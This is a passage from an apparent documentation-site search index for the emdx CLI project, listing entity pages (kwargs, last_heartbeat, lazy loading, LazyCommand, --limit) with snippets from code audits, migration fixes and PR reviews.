Mentioned in: 8 documents | First seen: 2026-02-14</p>"},{"location":"entities/kwargs/#documents-8","title":"Documents (8)","text":"<ul> <li> <p>#6509 Any Type Removal Analysis [synthesis]   Section: Common Themes</p> </li> <li> <p>#6504 Any Type Removal Analysis [5/5]   Section: Summary</p> <p>...|-----------|-----------|-------| | <code>emdx/commands/delegate.py</code> | 3 | 3 | All are <code>**kwargs</code> wrappers | | <code>emdx/commands/compact.py</code> | 7 | 5 | Similarity matrix is tricky | | <code>emdx/commands/distill.py</code> | 5 | 4 | Audience enum return is fine | | `emdx/comman...</p> </li> <li> <p>#6485 Any Type Removal Analysis [3/5]   Section: Occurrence 1: PaletteResultWidget.init kwargs</p> <p>Current Signature:</p> </li> </ul> <pre><code>def __init__(self, result: PaletteResultItem, **kwargs: Any) -&gt; None:\n</code></pre> <ul> <li>#6437 Any/None typing audit [synthesis]   Section: Patterns of Any Usage <ol> <li>Dynamic Kwargs (4 occurrences) - <code>**kwargs: Any</code></li> </ol> </li> <li>Used in update functions with whitelist validation</li> <li> <p>Verdict: Mixed - some are unused (remove), others are intentional (consider TypedDict)</p> </li> <li> <p>#6436 Any/None typing audit [5/5]   Section: Any Type Audit: emdx/ui/</p> <p>This audit identifies uses of <code>Any</code> in function signatures/return types that could be replaced with more specific types. Skipped: Textual widget callbacks, args/*kwargs, TYPE_CHECKING imports.</p> </li> <li> <p>#6432 Any/None typing audit [1/5]   Section: groups.py</p> <p>...|----------|-----------|--------------|----------------------| | <code>create_group</code> | <code>**kwargs: Any</code> | Yes | Remove <code>**kwargs</code> entirely (unused, absorbs typos silently) | | <code>list_groups</code> | <code>params: list[Any]</code>, <code>**kwargs: Any</code> | Partial | <code>params</code> is le...</p> </li> <li> <p>#6417 Type System Audit: Replace Any/None with Concrete Types [4/4]   Section: 3. Text Area Host Protocol \u2014 <code>app_instance: Any</code> (5 occurrences)</p> </li> <li> <p>#6219 Delegate: Audit TYPE SAFETY DEBT in the emdx project: Find missing typ [9/14]   Section: Critical Issues (8)</p> </li> </ul>"},{"location":"entities/kwargs/#1-widget-kwargs-any-patterns-low-priority","title":"1. Widget <code>**kwargs: Any</code> Patterns (Low Priority)","text":"<p>Found in ~15 places across UI files. These are passed to Textual's <code>Widget.__init__()</code> which doesn't export typed kwargs.</p>"},{"location":"entities/kwargs/#in-text_areaspy-inputspy-vim_editorpy","title":"In text_areas.py, inputs.py, vim_editor.py:","text":"<p>def init(self, app_instance: TextAreaHost, args: Any, *kwargs: Any) -&gt; None: ```</p>"},{"location":"entities/kwargs/#5-untyped-kwargs-in-execution-updates","title":"5. Untyped <code>**kwargs</code> in execution updates","text":"<p>File: <code>emdx/models/executions.py:203</code> Issue: <code>def update_execution(exec_id: int, **kwargs) -&gt; None:</code> - kwargs can be anything, no validation Severity: CRITICAL</p>"},{"location":"entities/kwargs/#related-entities","title":"Related Entities","text":"<ul> <li><code>any usage</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>resultselected.result</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>recommended types:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>recommended types</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>preview_mode_manager.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>impact fixes</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>groups.py:list_groups</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>groups.py:create_group</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>dict[str, browserstate]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>keep as</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> </ul>"},{"location":"entities/lastheartbeat/","title":"last_heartbeat","text":"<p>Type: tech_term | Mentioned in: 11 documents | First seen: 2026-02-13</p>"},{"location":"entities/lastheartbeat/#documents-11","title":"Documents (11)","text":"<ul> <li> <p>#6466 Fix: Execution Dataclass Schema-Model Mismatch in EMDX   Section: Overview</p> <p>...ween the data model and database migrations. Additionally, code was referencing a <code>last_heartbeat</code> column that had been dropped in migration 013.</p> </li> <li> <p>#6302 DEBT-21: Execution System Test Coverage   Section: Additional Changes</p> </li> <li>2 tests skipped due to <code>last_heartbeat</code> column being removed in migration 013</li> <li>All tests use <code>doc_id=None</code> to avoid foreign key constraint issues</li> <li> <p>Added <code>clear_executions</code> fixture to ensure test isolation</p> </li> <li> <p>#6277 Delegate: DEBT-2: Fix schema-model mismatch. The Execution dataclass i   Section: DEBT-2: Fix schema-model mismatch in Execution dataclass</p> <p>Additionally, the code referenced the <code>last_heartbeat</code> column which was dropped in migration 013 when the table was recreated.</p> </li> <li> <p>#6268 Delegate: Document #6230 (Migration/Schema Debt Implementation)   Section: 2. Fixed Heartbeat Functionality (MEDIUM severity)</p> <p>The <code>last_heartbeat</code> column was dropped in migration 013 but the code still referenced it:</p> </li> <li> <p>#6249 Migration/Schema Debt Fix Implementation [6/14]   Section: Changes Made</p> <p>...<code>,</code>cost_usd<code>,</code>tokens_used<code>,</code>input_tokens<code>,</code>output_tokens` (migration 036)</p> </li> <li><code>last_heartbeat</code> (migration 037)</li> <li>Refactored all SELECT queries to use shared <code>_EXECUTION_COLUMNS</code> constant</li> <li> <p>Added <code>_row_to_execution()</code> helper for consistent parsing with backwar...</p> </li> <li> <p>#6246 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [5/37]   Section: Fix: Execution Dataclass Schema-Model Mismatch</p> <p>...t_tokens, output_tokens. Also fix any heartbeat queries that reference the dropped last_heartbeat column from migration 013.</p> </li> <li> <p>#6237 Delegate synthesis [synthesis]   Section: Critical Findings (Immediate Action Required)</p> <p>..._run_id<code>,</code>task_id<code>,</code>cost_usd<code>,</code>tokens_used<code>,</code>input_tokens<code>,</code>output_tokens`</p> </li> <li> <p><code>last_heartbeat</code> column queries exist but column was dropped in migration 013</p> </li> <li> <p>#6228 Delegate: Audit MIGRATION/SCHEMA DEBT in the emdx project: Check datab [6/14]   Section: 2. LOW: <code>last_heartbeat</code> Column Missing from Execution Model**</p> <p>The <code>last_heartbeat</code> column exists in the schema but is NOT in the Execution dataclass. However, migration 013 dropped this column when recreating the executions table:</p> </li> <li> <p>#6216 Delegate: Audit MIGRATION/SCHEMA DEBT in the emdx project: Check datab [6/14]   Section: HIGH Severity</p> </li> <li> <p>#6170 Delegate: Analyze the task execution tracking system. Read emdx/models [9/15]   Section: 1. Executions Table (<code>models/executions.py</code>)</p> <p>...EXT | Working directory | | <code>pid</code> | INTEGER | Process ID for zombie detection | | <code>last_heartbeat</code> | TIMESTAMP | For stale detection |</p> </li> <li> <p>#6160 Delegate: Analyze how tasks integrate with delegate. Read emdx/command [4/15]   Section: Overlap Between Delegate's Task Tracking and Task System</p> </li> <li><code>log_file</code> \u2014 path to execution log</li> <li><code>working_dir</code>, <code>pid</code> \u2014 runtime info</li> <li><code>last_heartbeat</code> \u2014 liveness tracking</li> </ul>"},{"location":"entities/lastheartbeat/#notes","title":"Notes","text":""},{"location":"entities/lastheartbeat/#1-migration-013-drops-last_heartbeat-column-data-loss-risk","title":"1. Migration 013 Drops last_heartbeat Column (DATA LOSS RISK)","text":"<p>Location: <code>migrations.py:800-848</code> Issue: Migration 013 recreates the executions table but OMITS the <code>last_heartbeat</code>  column that w...</p>"},{"location":"entities/lastheartbeat/#execution-specific-fields-not-in-tasks","title":"Execution-Specific Fields (not in tasks):","text":""},{"location":"entities/lastheartbeat/#related-entities","title":"Related Entities","text":"<ul> <li><code>tokens_used: int = 0</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> <li><code>output_tokens: int = 0</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> <li><code>model mismatch</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> <li><code>input_tokens: int = 0</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> <li><code>cost_usd: float = 0.0</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> <li><code>update_execution_heartbeat()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> <li><code>get_stale_executions()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> <li><code>task_id: optional[int] = none</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>schema debt fix implementation</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>migration/schema debt fix implementation</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> </ul>"},{"location":"entities/lazy-loading/","title":"lazy loading","text":"<p>Type: heading | Mentioned in: 10 documents | First seen: 2026-02-13</p>"},{"location":"entities/lazy-loading/#documents-10","title":"Documents (10)","text":"<ul> <li>#6467 emdx distill Command Implementation   Section: Core Components <p>...the CLI interface</p> </li> <li>Uses <code>@app.callback(invoke_without_command=True)</code> pattern for lazy loading</li> <li>Supports both topic-based search (hybrid search) and tag-based filtering</li> <li> <p>Automatically tags saved syntheses with \"distilled\" and \"for-{audience}\"</p> </li> <li> <p>#6191 Delegate: analysis [3/3]   Section: Architecture</p> </li> <li> <p>#6158 Delegate: analysis [5/5]   Section: Lazy Loading</p> <p>CLI uses lazy loading for performance:</p> </li> <li>Core commands: eagerly loaded (save, find, view, tag)</li> <li> <p>Heavy commands: lazy loaded (cascade, delegate, ai, similar)</p> </li> <li> <p>#6154 Delegate: analysis [3/3]   Section: Design Patterns</p> </li> <li> <p>#6666 Prime Command Redesign: External Tool Research [1/4]   Section: 6. Design Philosophy: \"Just Enough Context\"</p> <p>...current task, placing it in the high-attention zone at the conversation's end</p> </li> <li>Lazy loading \u2014 Child CLAUDE.md, skills, topic files all load on-demand, keeping initial overhead low</li> <li> <p>Compaction-friendly \u2014 Less initial context = more room before compac...</p> </li> <li> <p>#6324 Delegate: Architecture Improvement Analysis v0.14.0 [9/10]   Section: 1. Architectural Strengths</p> <p>...separation between <code>commands/</code>, <code>services/</code>, <code>database/</code>, <code>models/</code>, and <code>ui/</code></p> </li> <li>Lazy Loading: Heavy commands (cascade, delegate, AI) use lazy imports for fast CLI startup</li> <li> <p>Strategy Pattern: CLI executor factory (<code>cli_executor/factory.py</code>) supports mul...</p> </li> <li> <p>#6314 Delegate: analysis,architecture,active [13/15]   Section: Core Architecture Layers</p> </li> <li>Lazy loading for heavy commands (cascade, delegate, ai) to minimize startup time</li> <li>Safe mode (<code>EMDX_SAFE_MODE=1</code>) disables execution commands</li> <li> <p>Tag shorthand rewriting:...</p> </li> <li> <p>#6152 PR Review: #454 Semantic Find Upgrade   Section: Code Quality Assessment</p> <p>...Dataclass usage: <code>Chunk</code>, <code>ChunkMatch</code>, <code>HybridSearchResult</code> well-defined</p> </li> <li>Lazy loading: Embedding service loaded only when needed</li> <li>Fallback handling: Graceful degradation when no embeddings exist</li> <li> <p>Tag integration: Results include tags via...</p> </li> <li> <p>#6147 Delegate: Review PR #452 (Auto-Linking). Run: gh pr diff 452. Check co [5/7]   Section: Code Quality</p> <p>...1. Clean architecture \u2014 <code>LinkingService</code> properly separated from commands</p> </li> <li>Lazy loading \u2014 Embedding service loaded only when needed</li> <li>Error handling \u2014 Graceful fallbacks when embeddings unavailable</li> <li> <p>Bidirectional links \u2014 Both forward and re...</p> </li> <li> <p>#6351 Delegate: Analyze upgrading typer from ^0.15.0 to ^0.23.1 for the emdx [1/2]   Section: 2.5 Lazy Loading <code>rich_utils</code> (v0.17.0)</p> <p>Impact: \u2705 Free improvement - complements our existing lazy loading system in <code>LazyTyperGroup</code>.</p> </li> </ul>"},{"location":"entities/lazy-loading/#directory-structure","title":"Directory Structure","text":"<p>``` emdx/ \u251c\u2500\u2500 main.py              # CLI entry point with lazy loading \u251c\u2500\u2500 commands/            # 19 command modules \u2502   \u251c\u2500\u2500 core.py          # save, find, view, edit, delete \u2502   \u251c\u2500\u2500 browse.py        # list, stats, recent \u2502   \u251c\u2500\u2500 tags.p...</p>"},{"location":"entities/lazy-loading/#lazy-loading_1","title":"Lazy Loading","text":"<p>Heavy commands (cascade, delegate, ai) use lazy imports for fast CLI startup.</p>"},{"location":"entities/lazy-loading/#1-entry-point-mainpy","title":"1. Entry Point (<code>main.py</code>)","text":""},{"location":"entities/lazy-loading/#related-entities","title":"Related Entities","text":"<ul> <li><code>safe mode</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.4)</li> <li><code>emdx_safe_mode=1</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.4)</li> <li><code>emdx codebase analysis</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.4)</li> <li><code>version:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>optional dependencies heavy</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>license:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>lazy loading heavy</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>key tables</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>strategy pattern</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>sqlite + fts5</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> </ul>"},{"location":"entities/lazycommand/","title":"lazycommand","text":"<p>Type: tech_term | Mentioned in: 11 documents | First seen: 2026-02-22</p>"},{"location":"entities/lazycommand/#documents-11","title":"Documents (11)","text":"<ul> <li> <p>#6839 Delegate: list   Section: 2. <code>emdx/utils/lazy_group.py</code> \u2014 Help text delegation</p> <p>Problem: <code>emdx delegate --help</code> showed incomplete help because <code>LazyCommand</code> didn't override <code>format_help()</code> \u2014 it used <code>click.MultiCommand</code>'s default instead of delegating to the real loaded command.</p> </li> <li> <p>#6837 Delegate: list [1/2]   Section: Fix: Delegate subcommand routing (<code>list</code>, <code>running</code>, <code>stats</code>, etc.)</p> <ol> <li><code>emdx/utils/lazy_group.py</code> (lines 163-166): Added <code>format_help()</code> to <code>LazyCommand</code> so that <code>--help</code> renders the full help text from the loaded real command, not just the placeholder.</li> </ol> </li> <li> <p>#6835 Delegate: list   Section: Changes on disk (uncommitted)</p> <p><code>emdx/utils/lazy_group.py</code>:</p> </li> <li> <p>Added <code>format_help()</code> method to <code>LazyCommand</code> so <code>--help</code> properly delegates to the real loaded command instead of showing empty help</p> </li> <li> <p>#6836 Delegate: list   Section: Changes</p> <p><code>emdx/utils/lazy_group.py</code> (1 change):</p> </li> <li> <p>Added <code>format_help()</code> to <code>LazyCommand</code> \u2014 delegates help formatting to the real loaded command, so <code>emdx delegate --help</code> properly shows the Commands section with all subcommands listed</p> </li> <li> <p>#6833 Delegate: list   Section: Summary</p> <p>...\u2014 Help delegation for lazy-loaded commands</p> </li> <li> <p>Added <code>format_help()</code> method to <code>LazyCommand</code> so that <code>emdx delegate --help</code> properly delegates to the real (loaded) command's help formatter, showing the full help text including subcommands</p> </li> <li> <p>#6830 Delegate: --help [2/2]</p> <p><code>emdx/utils/lazy_group.py</code>:</p> </li> <li> <p>Added <code>format_help()</code> method to <code>LazyCommand</code> that delegates to the real loaded command, ensuring <code>emdx delegate --help</code> renders the full help text from the actual command rather than the lazy wrapper's stub.</p> </li> <li> <p>#6829 Delegate: --help [2/2]   Section: Summary</p> </li> <li> <p>#6789 Delegate: --help [2/2]</p> <p>...(e.g. \"Use Sonnet model (shortcut for --model sonnet)\" \u2192 \"Use Sonnet model\")</p> </li> <li> <p>LazyCommand fix \u2014 Added <code>format_help()</code> override in <code>LazyCommand</code> to delegate to the real command, ensuring rich markup renders correctly through the lazy-loading layer</p> </li> <li> <p>#6787 Delegate: list [1/2]</p> <p><code>emdx/utils/lazy_group.py</code>:</p> </li> <li> <p>Added <code>format_help()</code> override to <code>LazyCommand</code> so the Rich-formatted help renders correctly through the lazy proxy</p> </li> <li> <p>#6786 Delegate: --help [2/2]</p> <p>...all option help strings.</p> </li> <li> <p><code>lazy_group.py</code>: Added <code>format_help()</code> override to <code>LazyCommand</code> so it delegates help formatting to the real command, enabling Rich markup to render through the lazy loading layer....</p> </li> <li> <p>#6785 Delegate: --help [2/2]   Section: Changes</p> </li> <li>Added <code>format_help()</code> override to <code>LazyCommand</code> \u2014 delegates help formatting to the real command, so Rich panels and markup render correctly through the lazy loading proxy</li> </ul>"},{"location":"entities/lazycommand/#1-emdxutilslazy_grouppy-added-format_help-to-lazycommand","title":"1. <code>emdx/utils/lazy_group.py</code> \u2014 Added <code>format_help()</code> to <code>LazyCommand</code>","text":"<p>Previously, <code>LazyCommand</code> (a <code>click.MultiCommand</code>) didn't override <code>format_help()</code>, so when <code>--help</code> was invoked on a lazily-loaded command like <code>delegate</code>, it woul...</p>"},{"location":"entities/lazycommand/#emdxutilslazy_grouppy","title":"<code>emdx/utils/lazy_group.py</code>","text":""},{"location":"entities/lazycommand/#related-entities","title":"Related Entities","text":"<ul> <li><code>format_help()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (11 shared docs, PMI=6.3)</li> <li><code>typer.typer()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> <li><code>`emdx/utils/lazy_group.py</code>:` \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> <li><code>emdx delegate stats</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>click.multicommand</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>emdx/utils/lazy_group.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>1.</code>emdx/commands/delegate.py<code>\u2014 subcommand routing fix</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>import click</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.9)</li> <li><code>help=</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (7 shared docs, PMI=5.9)</li> <li><code>`emdx/commands/delegate.py</code>:` \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.9)</li> </ul>"},{"location":"entities/limit/","title":"--limit","text":"<p>Type: tech_term | Mentioned in: 15 documents | First seen: 2025-07-07</p>"},{"location":"entities/limit/#documents-15","title":"Documents (15)","text":"<ul> <li> <p>#6864 Delegate synthesis [synthesis]   Section: Key Findings</p> <p>...s | | <code>emdx task dep/chain/note</code> | 3 task subcommands | | <code>emdx delegate --task</code>, <code>--limit</code> | 2 delegate flags | | <code>emdx find --wiki</code>, <code>--all-types</code> | 2 find flags | | Document links, entities, wiki tables | Database schema |</p> </li> <li> <p>#6863 Delegate: Audit docs/ folder: Read docs/cli-api.md, docs/architecture. [3/3]   Section: docs/cli-api.md</p> <p>...op-level command with <code>--threshold</code>, <code>--questions</code>, <code>--gaps</code>, <code>--json</code>, <code>--rich</code>, <code>--limit</code> flags. It clusters documents by content similarity to build a topic map. Not mentioned in cli-api.md at all.</p> </li> <li> <p>#6862 Delegate: Audit README.md: Read the full README.md and check every CLI [1/3]   Section: Issues Found</p> <p>Issue 9 \u2014 Missing <code>--limit</code> / <code>-l</code> flag on <code>emdx delegate</code> in documentation The README doesn't mention the <code>--limit</code> / <code>-l</code> flag for budget control on delegates (`--limit FLOAT: Max budget i...</p> </li> <li> <p>#6838 Delegate: list [1/3]</p> <p>Now I see the pattern clearly. The user is testing <code>emdx delegate \"list\" \"--limit\" \"3\"</code> (or similar) \u2014 passing subcommand names as task prompts. This is the bug where subcommand names get swallowed as task arguments because of `invoke_without_comm...</p> </li> <li> <p>#6598 Delegate synthesis [synthesis]   Section: Implementation Roadmap</p> </li> <li>[ ] <code>emdx import &lt;path&gt;</code> command</li> <li>[ ] Frontmatter parsing (title, tags)</li> <li>[ ] <code>--dry-run</code>, <code>--limit</code>, <code>--tags</code> flags</li> <li> <p>[ ] Folder \u2192 project mapping</p> </li> <li> <p>#6596 Delegate: Research import paths \u2014 how should emdx import from Obsidian [3/4]   Section: Minimum Viable Command</p> <p>```bash emdx import ./my-notes/             # Import all .md files emdx import ./docs --project \"docs\" # Force project name emdx import ./notes --dry-run       # Preview without saving emdx import ./notes --limit 10      # Test with subset</p> </li> </ul> <pre><code>\n- **#6593** Delegate: Research import paths \u2014 how should emdx import from Obsidian [3/4]\n  *Section: Key Features for Adoption*\n  &gt; ...w\nemdx import ./vault --dry-run           # Preview everything\nemdx import ./vault --limit 10          # Test with subset\nemdx import ./vault --tags \"imported\"   # Tag all imports for easy rollback\nemdx import ./vault                     # Full import\n</code></pre> <ul> <li> <p>#6519 Delegate: Analyze FEAT-7: Re-implement ask-kb improvements (PR #453).  [2/2]   Section: <code>emdx/commands/ask.py</code> (Current State)</p> ...ture Status Basic <code>emdx ai ask</code> command \u2705 Exists <code>--limit</code>, <code>--project</code> filters \u2705 Exists <code>--keyword</code> (force keyword search) \u2705 Exists <code>--sources/--no-sources</code> toggle \u2705 Exists <code>--verbose</code> debug mode \u2705 Exis... </li> <li> <p>#6446 Implement emdx distill command   Section: Files Created/Modified</p> <p>...rsist distilled output to KB</p> </li> <li><code>--quiet</code> mode for machine-readable output</li> <li> <p><code>--limit</code> to control number of source documents</p> </li> <li> <p>#6413 Delegate: Implement 'emdx review' CLI commands for triaging agent-prod   Section: Files Changed</p> <ol> <li><code>emdx review list</code> - Lists documents tagged 'needs-review'</li> </ol> </li> <li>Shows Rich table with ID, title, created date, and tags</li> <li>Supports <code>--limit</code> for pagination</li> <li> <p>Supports <code>--json</code> for JSON output</p> </li> <li> <p>#6412 Delegate: Implement 'emdx review' CLI commands for triaging agent outp   Section: Changes Made</p> <ul> <li><code>emdx review list</code> \u2014 Shows documents tagged 'needs-review'</li> </ul> </li> <li>Supports <code>--limit</code> and <code>--json</code> options</li> <li> <p>Displays clean table with document info</p> </li> <li> <p>#6366 Gameplan: emdx distill \u2014 Synthesize KB Content for Sharing   Section: Implementation Tasks</p> <p>..., help=\"Audience: me, docs, or custom string\"),     limit: int = typer.Option(20, \"--limit\", \"-n\", help=\"Max source documents\"),     save: bool = typer.Option(False, \"--save\", \"-s\", help=\"Save to KB\"),     title: str | None = typer.Option(None, \"--title\",...</p> </li> <li> <p>#6236 Delegate: Audit TESTING DEBT in the emdx project: Find untested public [10/14]   Section: 5. MISSING CLI INTEGRATION TESTS</p> <p>...auto-tag<code>,</code>--supersede<code>, stdin piping | |</code>emdx find<code>| Basic search |</code>--sort<code>,</code>--limit<code>,</code>--offset<code>,</code>--project<code>| |</code>emdx delegate<code>| Unit tests only | Full CLI integration with mocked executor | |</code>emdx tag<code>| Add/remove/list |</code>rename<code>,</code>merge<code>,</code>ba...</p> </li> <li> <p>#6142 Delegate: Read gameplan by running: emdx view 6102. Implement the Know [6/7]   Section: New Commands</p> <p>...O: Low importance stale &gt; 60 days (archive candidates)</p> </li> <li> <p>Options: <code>--project</code>, <code>--limit</code>, <code>--min-days</code>, <code>--json</code></p> </li> <li> <p>#16 Clauding Refactor Implementation Summary   Section: What Was Done</p> <ol> <li>Merged Duplicate Functions</li> </ol> </li> <li>Combined 3 versions of <code>claude-find</code> into one with optional flags</li> <li><code>--snippets</code>, <code>--fuzzy</code>, <code>--project</code>, <code>--limit</code> options</li> <li>Maintains backward compatibility</li> </ul>"},{"location":"entities/limit/#phase-3-import-mvp-1-week","title":"Phase 3: Import MVP (1 week)","text":""},{"location":"entities/limit/#related-entities","title":"Related Entities","text":"<ul> <li><code>--obsidian</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.8)</li> <li><code>wikilink handling options</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>wikify</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>user resolution flow</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>title extraction priority</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>technical implementation notes</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>see: [[x]]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>reference</code> 